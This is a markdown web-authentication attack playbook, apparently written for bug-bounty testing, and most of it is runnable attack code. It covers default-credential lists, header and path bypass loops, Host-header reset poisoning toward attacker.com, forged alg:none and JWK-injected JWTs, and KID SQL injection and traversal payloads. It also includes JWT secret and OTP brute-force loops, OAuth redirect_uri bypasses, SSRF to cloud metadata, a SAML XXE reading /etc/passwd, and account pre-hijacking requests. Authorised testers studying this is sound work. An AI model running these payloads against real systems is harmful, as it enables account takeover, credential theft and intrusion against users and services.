# 13 — Authentication Failures & Flows

## Goal
Exhaustive attacker playbook for every authentication failure class in web apps.
Covers unauth bypass → session → JWT → OAuth/OIDC → SAML → MFA → password reset → registration.

---

## Mental Model: Auth Failure Taxonomy

```
[Pre-Auth]         [Session Layer]      [Token Layer]        [Federation Layer]    [2FA/Reset Layer]
Auth bypass   →    Session mgmt    →    JWT attacks     →    OAuth/OIDC/SAML  →   MFA bypass
Default creds      Session fixation     alg:none             state CSRF           OTP brute force
Mass assignment    Cookie flags         KID injection        redirect_uri          Host header
HTTP tricks        Token in URL         JWK injection        Account linking       Predictable token
Version bypass     Long-lived tokens    RS256→HS256          PKCE bypass           Reset reuse
```

---

## 1 — Authentication Bypass (Unauth → Authenticated)

### 1.1 Default / Weak Credentials

```bash
# Common admin panels exposed after service fingerprint (Phase 3.3)
# Tools miss multi-step login — manual check required
panels=(
  "http://$T/admin admin:admin"
  "http://$T/admin admin:password"
  "http://$T/wp-admin admin:admin"
  "http://$T/jenkins admin:password"
  "http://$T/kibana elastic:changeme"
  "http://$T/grafana admin:admin"
  "http://$T/phpmyadmin root:"
  "http://$T/redisinsight"  # often no auth at all
)
# Use hydra / medusa only where program policy allows; manual for sensitive targets
```

### 1.2 HTTP Header-Based Auth Bypass

```bash
# Many apps trust internal headers from load balancer / proxy
# Test these against protected endpoints (admin, /internal, /v1/admin, etc.)
PROTECTED="https://$T/admin"

curl -s "$PROTECTED" -H "X-Forwarded-For: 127.0.0.1"
curl -s "$PROTECTED" -H "X-Real-IP: 127.0.0.1"
curl -s "$PROTECTED" -H "X-Originating-IP: 127.0.0.1"
curl -s "$PROTECTED" -H "X-Custom-IP-Authorization: 127.0.0.1"
curl -s "$PROTECTED" -H "X-Original-URL: /admin"
curl -s "$PROTECTED" -H "X-Rewrite-URL: /admin"
curl -s "$PROTECTED" -H "X-Override-URL: /admin"

# X-Forwarded-Host for password reset host header injection
curl -s "https://$T/forgot-password" -X POST \
  -H "Host: $T" \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@target.com"
# If reset link sent contains attacker.com domain → P1 ATO via password reset

# X-Host header variant
curl -s "https://$T/forgot-password" -X POST \
  -H "Host: $T" \
  -H "X-Host: attacker.com" \
  -d "email=victim@target.com"
```

### 1.3 URL / Path Tricks

```bash
# URL normalization bypasses — test each against a protected route
for trick in \
  "/admin" \
  "//admin" \
  "/admin/" \
  "/admin.json" \
  "/admin.html" \
  "/admin%2F" \
  "/admin%20" \
  "/admin;.js" \
  "/admin../" \
  "/ADMIN" \
  "/Admin" \
  "/%61dmin" \
  "/./admin" \
; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://$T$trick")
  echo "$code $trick"
done | grep -v "^30[0-9]\|^40[14]"
```

### 1.4 HTTP Method / Content-Type Override

```bash
# Method override: app checks auth on POST but not on _method=POST GET
curl -s "https://$T/api/admin/users" -G -d "_method=POST&_HttpMethod=DELETE"
curl -s "https://$T/api/admin/users" -X POST -H "X-HTTP-Method-Override: GET"
curl -s "https://$T/api/admin/users" -X POST -H "X-Method-Override: DELETE"

# Content-type confusion: endpoint expects application/json but only validates on specific Content-Type
curl -s "https://$T/api/admin" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '{"role":"admin"}'
```

### 1.5 API Version Bypass

```bash
# Old API versions often lack auth middleware added to newer ones
for ver in v0 v1 v2 v3 beta alpha legacy api2; do
  for path in /admin /users /config /debug /internal; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://$T/api/$ver$path")
    echo "$code /api/$ver$path"
  done
done | grep "^200\|^201\|^204"
```

### 1.6 Mass Assignment on Registration/Profile Update

```bash
# Send extra fields to registration endpoint
curl -s "https://$T/api/register" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","password":"Test123!",
       "role":"admin","is_admin":true,"admin":true,"verified":true,
       "plan":"enterprise","subscription":"premium"}'

# Profile update mass assignment
curl -s "https://$T/api/user/profile" -X PUT \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","email":"test@test.com","role":"admin","is_staff":true}'
```

### 1.7 Response Manipulation

```bash
# Intercept the auth response and modify it (Burp/mitmproxy)
# Common targets:
# {"authenticated": false}  →  {"authenticated": true}
# {"role": "user"}  →  {"role": "admin"}
# {"2fa_required": true}  →  {"2fa_required": false}
# HTTP 401 → 200 (some apps trust status code from upstream for downstream routing)
# Works when auth logic is client-side or when a proxy makes routing decisions on response body
```

---

## 2 — Session Management Failures

### 2.1 Session Not Invalidated (Logout / Password Change)

```bash
# 1. Capture session token before logout
TOKEN=$(curl -s -c cookies.txt "https://$T/api/auth/login" -X POST \
  -d '{"email":"test@test.com","password":"Test123!"}' | jq -r '.token // .session_id')

# 2. Logout
curl -s "https://$T/api/auth/logout" -H "Authorization: Bearer $TOKEN"

# 3. Test if token still works
curl -s "https://$T/api/user/me" -H "Authorization: Bearer $TOKEN"
# If returns user data → session not invalidated on logout → P2/P1 (depends on context)

# Same test after password change
# Change password → old token should be revoked
```

### 2.2 Session Fixation

```bash
# 1. Get a pre-auth session ID
FIXED_SID=$(curl -s -c - "https://$T/login" | grep 'session\|PHPSESSID\|JSESSIONID' | awk '{print $NF}')

# 2. Craft login request with that session ID
curl -s "https://$T/login" -X POST \
  -H "Cookie: PHPSESSID=$FIXED_SID" \
  -d "username=victim&password=pass"

# 3. If the server accepts the login and keeps the same SID → session fixation
# Attacker who knows $FIXED_SID before victim logs in → hijacks victim's session
```

### 2.3 Cookie Security Flags

```bash
# Check all auth cookies for missing flags
curl -s -I "https://$T/login" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" | grep -i 'set-cookie'

# Flags to look for:
# Secure — MUST be set (prevents HTTP transmission)
# HttpOnly — MUST be set (prevents JS access → XSS → cookie theft)
# SameSite=Strict or Lax — MUST be set (CSRF protection)
# Domain=.parent.com — broad domain = cookie sent to all subdomains (XSS on subdomain → session theft)
# No Expires / short Expires — long-lived = bigger window for theft

# Automated: check with testssl.sh or manually with curl -v and read Set-Cookie headers
```

### 2.4 Predictable Session Token

```bash
# Collect multiple session tokens and analyze entropy
for i in $(seq 1 10); do
  curl -s "https://$T/api/auth/login" -X POST \
    -d '{"email":"test@test.com","password":"Test123!"}' | jq -r '.token'
done > tokens.txt

# Visual inspection: do tokens share common prefixes? Are they sequential base64?
# Entropy analysis:
python3 -c "
import base64, math, collections
tokens = open('tokens.txt').read().splitlines()
for tok in tokens:
    try:
        decoded = base64.b64decode(tok + '==')
        c = collections.Counter(decoded)
        entropy = -sum((v/len(decoded))*math.log2(v/len(decoded)) for v in c.values())
        print(f'entropy={entropy:.2f} ({entropy*len(decoded):.0f} bits) : {tok[:30]}...')
    except:
        print(f'not_b64: {tok[:30]}...')
"
# Low entropy (<3.0 bits/byte) → weak PRNG → predictable
```

---

## 3 — JWT Attacks

### 3.1 Algorithm: none (Signature Strip)

```bash
# Craft a JWT with alg:none — many libraries accept it if not explicitly denied
python3 -c "
import base64, json

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({'alg': 'none', 'typ': 'JWT'}))
payload = b64url(json.dumps({'sub': '1', 'role': 'admin', 'iat': 9999999999}))
print(f'{header}.{payload}.')   # no signature
print(f'{header}.{payload}. ')  # trailing space variant
"
# Test with curl -H "Authorization: Bearer <crafted_token>"
```

### 3.2 Algorithm Confusion: RS256 → HS256 (Public Key as Secret)

```bash
# If server uses RS256, get its public key then sign a token with HS256 using that public key as secret
# Get the public key (common locations)
for path in /.well-known/jwks.json /jwks.json /auth/jwks /oauth/jwks /api/auth/keys \
            /.well-known/openid-configuration; do
  curl -s "https://$T$path" | python3 -m json.tool 2>/dev/null | grep -q '"keys"' && \
    echo "[JWKS FOUND] $path"
done

# Extract PEM from JWKS
python3 - <<'PYEOF'
import json, base64, struct, sys
# pip install cryptography
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

jwks = json.load(sys.stdin)  # pipe JWKS JSON
for key in jwks.get('keys', []):
    if key.get('kty') == 'RSA':
        n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')
        e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')
        pub = RSAPublicNumbers(e, n).public_key(default_backend())
        pem = pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
        print(pem.decode())
PYEOF

# Then use jwt_tool or python-jwt to sign with HS256 using the extracted PEM as secret
pip install jwt-tool 2>/dev/null
jwt_tool.py -X a -pk public.pem -I -pc sub -pv admin_user_id "$ORIGINAL_TOKEN"
```

### 3.3 JWK Set Injection (Embed Your Own Key)

```bash
# Generate a key pair, embed the public key in the JWT header as "jwk"
# Server that auto-trusts the JWK in the header will verify with your key → you control signing

python3 - <<'PYEOF'
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import base64, json

key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
pub = key.public_key()
pub_nums = pub.public_key().public_numbers() if hasattr(pub,'public_key') else pub.public_numbers()

def to_b64url(n):
    return base64.urlsafe_b64encode(n.to_bytes((n.bit_length()+7)//8,'big')).rstrip(b'=').decode()

jwk = {"kty":"RSA","n":to_b64url(pub_nums.n),"e":to_b64url(pub_nums.e),"use":"sig","alg":"RS256"}
print("JWK to embed in header:", json.dumps(jwk))
PYEOF
# Sign the JWT with this private key; embed the JWK in the header
# jwt_tool.py -X i <token>
```

### 3.4 KID (Key ID) Injection

```bash
# kid = which key to use for verification — if not sanitized → SQL injection or path traversal
# SQL injection in kid:
# kid = "' UNION SELECT 'attacker_secret'-- -"  → HMAC secret = 'attacker_secret'
jwt_tool.py -I -hc kid -hv "' UNION SELECT 'attacker_secret'-- -" \
  -S hs256 -p "attacker_secret" "$ORIGINAL_TOKEN"

# Path traversal in kid:
# kid = "../../dev/null" → HMAC secret = empty string (empty file)
jwt_tool.py -I -hc kid -hv "../../dev/null" -S hs256 -p "" "$ORIGINAL_TOKEN"

# kid = "../../proc/sys/kernel/randomize_va_space" → known byte value as secret
```

### 3.5 JWT Secret Brute Force

```bash
# If HS256 is used with a weak secret
hashcat -a 0 -m 16500 "$JWT_TOKEN" /usr/share/wordlists/rockyou.txt --show

# Common weak JWT secrets:
python3 -c "
secrets = ['secret','password','jwt','mysecret','123456','qwerty','changeme',
           'your-256-bit-secret','your-512-bit-secret','supersecret','jwt-secret',
           'jwtpassword','secretkey','key','mykey','privatekey']
for s in secrets: print(s)
" | while read s; do
  python3 -c "
import jwt, sys
try:
    jwt.decode('$JWT_TOKEN', '$s', algorithms=['HS256'])
    print('CRACKED:', '$s')
except: pass
" 2>/dev/null
done
```

### 3.6 JWT Claims Not Validated

```bash
# Test if exp (expiry), iss (issuer), aud (audience) are enforced
# Expired token: just use an old token and test if it still works
# Wrong issuer: modify iss claim to attacker.com
# Wrong audience: modify aud to a different service

# jwt_tool for claim modification
jwt_tool.py -I -pc sub -pv "another_user_id" "$TOKEN"           # sub claim IDOR
jwt_tool.py -I -pc role -pv "admin" "$TOKEN"                    # privilege escalation
jwt_tool.py -I -pc exp -pv 9999999999 "$TOKEN"                  # extend expiry
jwt_tool.py -I -pc iss -pv "attacker.com" "$TOKEN"              # wrong issuer
```

---

## 4 — OAuth 2.0 / OIDC Attacks

### 4.1 Missing State Parameter → CSRF

```bash
# Check if state parameter is present in authorization URL
# Start OAuth flow and capture the authorization URL
# If no state= parameter → CSRF → attacker can force victim to authorize attacker's account

# PoC: CSRF to link attacker's account
# 1. Attacker starts OAuth flow, captures authorization URL (with code or token for attacker's account)
# 2. Victim visits attacker-controlled page that loads that URL in an img/iframe
# 3. Victim's browser completes OAuth → attacker's account linked to victim's account → ATO
```

### 4.2 redirect_uri Manipulation

```bash
# Find registered redirect_uri patterns by reading the OAuth error messages
curl -s "https://$T/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com&response_type=code"
# Common bypasses:
# Open redirect in allowed domain: redirect_uri=https://allowed.com/redirect?url=https://evil.com
# Subdomain: redirect_uri=https://evil.allowed.com (if wildcard *.allowed.com is registered)
# Path traversal: redirect_uri=https://allowed.com/../evil
# Fragment abuse: redirect_uri=https://allowed.com#.evil.com

for redir in \
  "https://attacker.com" \
  "https://attacker.com%2f@allowed.com" \
  "https://allowed.com.attacker.com" \
  "https://allowed.com/../../../redirect?url=https://attacker.com" \
  "https://allowed.com/callback#@attacker.com" \
; do
  curl -sv "https://$T/oauth/authorize?client_id=CLIENT&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$redir'))")&response_type=code" 2>&1 | grep -i 'location:'
done
```

### 4.3 Authorization Code Reuse

```bash
# OAuth code should be single-use
# After completing OAuth flow, capture the code
# Attempt to exchange it again
CODE="extracted_auth_code"
# Exchange 1 (legitimate)
curl -s "https://$T/oauth/token" -X POST \
  -d "grant_type=authorization_code&code=$CODE&redirect_uri=https://$T/callback&client_id=CLIENT&client_secret=SECRET"
# Exchange 2 (should fail)
curl -s "https://$T/oauth/token" -X POST \
  -d "grant_type=authorization_code&code=$CODE&redirect_uri=https://$T/callback&client_id=CLIENT&client_secret=SECRET"
# If second request returns an access_token → code reuse → not enforced
```

### 4.4 PKCE Downgrade

```bash
# PKCE (Proof Key for Code Exchange) prevents code interception attacks
# If server allows omitting code_challenge parameter → PKCE bypass

# Normal PKCE flow includes code_challenge + code_challenge_method
# Test without PKCE:
curl -s "https://$T/oauth/authorize?client_id=CLIENT&redirect_uri=https://$T/callback&response_type=code"
# If no error → PKCE not enforced → code interception possible

# Test with wrong verifier during token exchange
curl -s "https://$T/oauth/token" -X POST \
  -d "grant_type=authorization_code&code=$CODE&code_verifier=wrongverifier&client_id=CLIENT"
# If returns token → PKCE verification skipped
```

### 4.5 Client Secret in JS Bundle (Public Client Leaking Confidential Credential)

```bash
# Confidential OAuth clients have a client_secret — this must NEVER be in JS
grep -rh 'client_secret\|clientSecret\|CLIENT_SECRET\|oauth_secret' js_files/ beautified/ recovered/ | \
  grep -v '^\s*//' | head -20

# Also check for refresh tokens in JS (should only be in server-side storage)
grep -rh 'refresh_token\|refreshToken' js_files/ | grep -v 'function\|param\|param\|type' | head -10

# OAuth client_id is not a secret but client_secret absolutely is
# If found: confirm it works → report P1
```

### 4.6 OIDC — request_uri SSRF

```bash
# RFC 9101: OIDC supports request_uri parameter — server fetches the JWT from that URL
# If server doesn't validate the URL → SSRF
curl -sv "https://$T/oauth/authorize?client_id=CLIENT&request_uri=http://169.254.169.254/latest/meta-data/"
curl -sv "https://$T/oauth/authorize?client_id=CLIENT&request_uri=http://metadata.google.internal/"
```

### 4.7 nonce / iss / aud Not Validated

```bash
# Get a valid OIDC id_token and modify claims
# iss not checked → cross-issuer attack (accept tokens from a malicious OIDC provider)
# aud not checked → token meant for service A accepted by service B
# nonce not checked → replay old id_token
jwt_tool.py -I -pc iss -pv "https://accounts.attacker.com" "$ID_TOKEN"
jwt_tool.py -I -pc aud -pv "another_client_id" "$ID_TOKEN"
```

---

## 5 — SAML Attacks

### 5.1 XML Signature Wrapping (XSW)

```bash
# Intercept SAML response (Burp Suite → SAML Editor extension)
# XSW: move the signed element into the Extensions, inject a forged assertion as the real one
# The signature validates on the moved (legitimate) element but the app reads the injected one

# Test with SAML Raider (Burp extension) → XSW #1 through #8 automatically
# Or use saml2-xsw-test: https://github.com/attackercan/saml2-xsw

# Manual XSW #2 (most common bypass):
# Original: <saml:Assertion ID="a1">...<ds:Signature>...</ds:Signature>...</saml:Assertion>
# Forged: <saml:Assertion ID="a2">EVIL</saml:Assertion>
#         <saml:Assertion ID="a1">...<ds:Signature>...</ds:Signature>...</saml:Assertion>
# SP reads first Assertion (a2 = attacker-controlled), validates signature on second (a1 = legitimate)
```

### 5.2 XXE in SAML

```bash
# SAML is XML — if the SP parses SAML without disabling external entities → XXE
# Inject XXE in the NameID or Attribute value
# Encoded SAML contains:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# ...
# <saml:NameID>&xxe;</saml:NameID>
```

### 5.3 Signature Not Validated / NameID Injection

```bash
# Test: remove the ds:Signature block entirely and submit
# If login succeeds → signature not validated → P1 (full auth bypass, become any user)

# NameID injection:
# Normal: user@company.com
# Injected: admin@company.com<!-- → some parsers strip the comment and everything after
# Also: admin@company.com%00 → null byte truncation
# Also: admin%40company.com → URL decoding issues

# XML comment injection in NameID:
# "user<!----@company.com" parsed as "user@company.com" by some parsers (strip comments in XML)
```

---

## 6 — MFA / 2FA Bypass

### 6.1 Direct Endpoint Hit (Skip 2FA Step)

```bash
# After completing step 1 (username/password), the server sets a partial-auth cookie/session
# Test if you can hit the final destination directly without the /verify-otp step

# 1. Complete password step → get partial-auth token
PARTIAL=$(curl -s "https://$T/api/auth/login" -X POST \
  -d '{"email":"test@test.com","password":"Test123!"}' | jq -r '.token // .session_id')

# 2. Skip OTP step → try hitting authenticated endpoints
curl -s "https://$T/api/user/me" -H "Authorization: Bearer $PARTIAL"
curl -s "https://$T/api/dashboard" -H "Cookie: session=$PARTIAL"
# If returns data → 2FA entirely bypassed
```

### 6.2 OTP Brute Force (No Rate Limit)

```bash
# 6-digit TOTP: 1,000,000 possibilities; SMS 4-digit: 10,000
# Test rate limiting on OTP endpoint
for otp in $(seq -w 1000 1100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://$T/api/auth/verify-otp" -X POST \
    -H "Authorization: Bearer $PARTIAL" \
    -d "{\"otp\":\"$otp\"}")
  echo "$code $otp"
  [ "$code" = "200" ] && echo "[FOUND] OTP=$otp" && break
  sleep 0.1  # minimal delay — test if lockout kicks in
done
```

### 6.3 OTP Reuse / Not Invalidated After Use

```bash
# Use a valid OTP once, then try using it again
OTP="123456"  # captured valid OTP
# First use
curl -s "https://$T/api/auth/verify-otp" -X POST \
  -H "Authorization: Bearer $PARTIAL" -d "{\"otp\":\"$OTP\"}"
# Second use (should fail)
curl -s "https://$T/api/auth/verify-otp" -X POST \
  -H "Authorization: Bearer $PARTIAL" -d "{\"otp\":\"$OTP\"}"
# If returns success → OTP reuse possible
```

### 6.4 2FA Removal Without Re-auth

```bash
# Test if 2FA can be disabled without entering current password or OTP
curl -s "https://$T/api/account/2fa/disable" -X POST \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{"reason":"lost_device"}'
# If 2FA disabled without verification → P2
```

### 6.5 Race Condition on OTP Validation

```bash
# Two concurrent requests with the same OTP — both should fail but one might succeed twice
# (before the server marks it used)
OTP="123456"
for i in 1 2; do
  curl -s "https://$T/api/auth/verify-otp" -X POST \
    -H "Authorization: Bearer $PARTIAL" -d "{\"otp\":\"$OTP\"}" &
done
wait
# If both return 200 → race condition → OTP reuse via race
# Use Turbo Intruder / concurrent HTTP for proper race testing
```

---

## 7 — Password Reset Attacks

### 7.1 Host Header Injection → Reset Link Poisoning

```bash
# Reset link generated using Host header → manipulate Host header → link points to attacker.com
curl -s "https://$T/api/auth/reset-password" -X POST \
  -H "Host: attacker.com" \
  -d '{"email":"victim@target.com"}'

# Also test X-Forwarded-Host
curl -s "https://$T/api/auth/reset-password" -X POST \
  -H "Host: $T" -H "X-Forwarded-Host: attacker.com" \
  -d '{"email":"victim@target.com"}'

# Dangling markup variant (for apps that validate exact Host but construct URLs manually)
curl -s "https://$T/api/auth/reset-password" -X POST \
  -H "Host: $T:@attacker.com" \
  -d '{"email":"victim@target.com"}'
```

### 7.2 Predictable / Weak Reset Token

```bash
# Collect multiple reset tokens for the same account and analyze
# Patterns to look for:
# - MD5(email) → trivially predictable
# - MD5(email + timestamp) → bruteforceable within the token validity window
# - Sequential / incrementing integer base64-encoded
# - Short (< 128 bits entropy) tokens

# Request 10 tokens and diff
for i in $(seq 10); do
  curl -s "https://$T/api/auth/reset-password" -X POST \
    -d '{"email":"test@test.com"}' > /dev/null
  # Capture token from test inbox (temp-mail) and record
done
```

### 7.3 Reset Token Reuse After Password Change

```bash
# After resetting password with a token, the token should be invalidated
TOKEN="old_reset_token"
# Reset the password
curl -s "https://$T/api/auth/reset-password/confirm" -X POST \
  -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass123!\"}"
# Try to use the same token again
curl -s "https://$T/api/auth/reset-password/confirm" -X POST \
  -d "{\"token\":\"$TOKEN\",\"password\":\"AnotherPass456!\"}"
# If second request succeeds → token reuse → P2
```

### 7.4 User Enumeration via Response Difference

```bash
# Registered vs. unregistered email gives different responses
curl -s "https://$T/api/auth/reset-password" -X POST -d '{"email":"definitelyregistered@target.com"}'
curl -s "https://$T/api/auth/reset-password" -X POST -d '{"email":"doesnotexist12345@target.com"}'
# Diff the responses — different message = user enumeration
# Also check response TIME (timing oracle) via: time curl ...
```

---

## 8 — Registration / Account Pre-Hijacking

### 8.1 Account Pre-Hijacking (Email Unverified)

```bash
# Register with victim's email BEFORE victim registers
# Victim later tries to register → "email already taken" OR victim verifies the attacker's account
curl -s "https://$T/api/auth/register" -X POST \
  -d '{"email":"victim@company.com","password":"AttackerPass123!"}'
# If registration succeeds without email verification requirement:
# → Victim goes to reset password → attacker account with victim email gets access
```

### 8.2 Account Merging / SSO Pre-Hijacking

```bash
# 1. Register attacker@evil.com as normal account
# 2. Change email to victim@company.com (without verifying the change)
# 3. Victim later signs up with Google OAuth (victim@company.com)
# 4. If server merges by email match without re-verification → attacker's session = victim's account
```

### 8.3 Unicode Normalization Attack

```bash
# Register ẚdmin@target.com (unicode lookalike) → server normalizes to admin@target.com
# Python: 'ẚ' (ẚ) normalizes to 'a' in NFKC form
python3 -c "
import unicodedata
targets = ['ẚdmin', 'аdmin', 'admın', 'admin ']  # unicode confusables + null byte
for t in targets:
    nfc = unicodedata.normalize('NFC', t)
    nfkc = unicodedata.normalize('NFKC', t)
    print(f'{t!r} → NFC={nfc!r} NFKC={nfkc!r}')
"

# Test: register with unicode variant of an admin/reserved account
# If login maps unicode back to ascii admin account → ATO
```

### 8.4 Email Plus-Addressing / Subdomain Trick

```bash
# admin+attacker@target.com → delivers to admin@target.com on many mail servers
# ADMIN@target.com = admin@target.com (case insensitive)
# Test if registration with these variants creates a separate account or clashes with existing one

curl -s "https://$T/api/auth/register" -X POST \
  -d '{"email":"admin+test@target.com","password":"Test123!"}'
curl -s "https://$T/api/auth/register" -X POST \
  -d '{"email":"ADMIN@target.com","password":"Test123!"}'
```

---

## 9 — API Authentication Failures

```bash
# API key in URL parameter → logged in server logs / proxy logs
grep -rh 'api_key=\|apikey=\|api-key=\|token=\|key=\|access_token=' all_urls.txt | \
  grep -v 'example\|sample\|placeholder' | head -20

# API versioning auth bypass
for ver in v1 v2 v3 beta legacy; do
  curl -s "https://$T/api/$ver/admin/users" | head -3
  curl -s "https://$T/$ver/api/admin/users" | head -3
done

# Scope upgrade via API: request additional scopes in token refresh
curl -s "https://$T/api/auth/token/refresh" -X POST \
  -H "Authorization: Bearer $REFRESH_TOKEN" \
  -d '{"scope":"admin:write user:delete"}'
```

---

## 10 — Auth Race Conditions

```bash
# Password change race: change email + concurrent session uses both old and new email
# TOCTOU: check role, change role, execute privileged action

# Concurrent login during 2FA window
# Start two login flows simultaneously — one completes 2FA, the other might skip it

# Use Turbo Intruder for true concurrent request races:
# Send 20 simultaneous requests for OTP validation → one may slip through before server marks used

# Timing analysis: is the auth check timing-based (early-exit on wrong char)?
time curl -s "https://$T/api/auth/login" -X POST -d '{"email":"a@a.com","password":"a"}'
time curl -s "https://$T/api/auth/login" -X POST -d '{"email":"realadmin@target.com","password":"a"}'
# Different timing → user enumeration via timing oracle
```

---

## 11 — SSO / Federation Failures

```bash
# .well-known/openid-configuration → read full OIDC config
curl -s "https://$T/.well-known/openid-configuration" | python3 -m json.tool

# Check:
# grant_types_supported: includes "password" → password grant = credential stuffing bypass
# (user sends username+password directly to /token endpoint, bypassing MFA!)
curl -s "$(curl -s https://$T/.well-known/openid-configuration | jq -r '.token_endpoint')" \
  -X POST -d "grant_type=password&username=admin@target.com&password=admin&client_id=CLIENT"

# SSO fallback: does the app allow password login when SSO is "enforced"?
# If /api/auth/login still accepts username+password → SSO enforcement is only UI-level

# Tenant isolation: user from org A accessing org B's resources via SSO
# Test by capturing SSO token issued for tenant A and replaying against tenant B's subdomain
```

---

## 12 — Auth Bypass Checklist (Run Against Every Protected Endpoint)

```
[ ] HTTP header bypass: X-Forwarded-For/X-Original-URL/X-Rewrite-URL with 127.0.0.1
[ ] URL normalization: //path, /path/, /path%2F, /path.json, /%61dmin
[ ] HTTP method override: X-HTTP-Method-Override header
[ ] API version bypass: /v0/, /v1/, /beta/, /legacy/
[ ] Mass assignment: role=admin, is_admin=true in registration/update
[ ] JWT: alg:none, RS256→HS256, JWK injection, KID SQLi/traversal, brute force
[ ] OAuth: missing state, redirect_uri bypass, code reuse, PKCE downgrade
[ ] SAML: XSW attack, remove signature, NameID injection, XXE
[ ] 2FA: skip step, OTP brute force, OTP reuse, response manipulation
[ ] Password reset: Host header injection, predictable token, token reuse, enumeration
[ ] Registration: pre-hijacking, mass assignment, unicode normalization, email tricks
[ ] Session: not invalidated on logout, predictable token, fixation, cookie flags
[ ] SSO: password grant, tenant isolation, fallback auth
[ ] Race condition: concurrent requests on 2FA/password change
```
